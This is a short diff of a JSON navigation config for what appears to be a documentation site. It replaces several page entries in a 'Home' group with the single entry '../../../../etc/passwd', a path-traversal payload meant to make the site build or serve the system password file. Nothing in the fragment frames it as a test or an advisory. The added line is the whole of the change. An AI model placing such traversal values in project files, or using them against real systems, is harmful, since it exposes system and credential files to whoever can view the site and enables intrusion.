@@ -11,10 +11,7 @@
     "group": "Home",
     "pages": [
      "index",
-     "impctl",
-     "imptrav",
-     "imptrav2",
-     "snip"
+     "../../../../etc/passwd"
     ]
    }
   ]
